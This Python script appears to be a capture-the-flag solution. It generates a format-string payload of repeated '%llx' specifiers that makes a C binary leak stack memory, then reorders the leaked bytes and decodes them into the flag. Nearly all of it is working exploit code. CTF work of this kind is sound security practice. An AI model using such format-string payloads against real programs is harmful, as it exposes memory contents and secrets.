from textwrap import wrap
import codecs


def gen_exploit_input():
    """ Generates the input for the c program """
    return "%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx"


def get_word(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def toggle_endianess(word):
    for i in range(len(word)//2):
        aux = word[i]
        word[i] = word[-1-i]
        word[-1-i] = aux
    return word


def get_flag_str(output_bytes):
    flag_str = []
    in_str = False

    for byte in output_bytes:
        if byte == '5f':  # underscore '_'
            in_str = True
        elif byte == '00':  # end of string '\0'
            in_str = False

        if in_str:
            flag_str.append(byte)

    return flag_str


def get_exploit_output(output):
    """ Converts the program's output to ascii """
    word_len = 8

    # Split at every 2 characters (every byte in hex format)
    output_bytes = wrap(output, 2)
    flag_little_endian = []

    flag_str = get_flag_str(output_bytes)

    # Convert to little endian
    for word in get_word(flag_str, word_len):
        new_word = toggle_endianess(word)
        for new_byte in new_word:
            flag_little_endian.append(new_byte)

    hex_flag = "".join(flag_little_endian)
    print("Little endian converted flag:", hex_flag)
    return bytearray.fromhex(hex_flag).decode()


if __name__ == "__main__":
    print("Put this as input for the binary:", gen_exploit_input())
    bin_output = input("Give me the binary's output:")
    print("Here's the processed output:", get_exploit_output(bin_output))
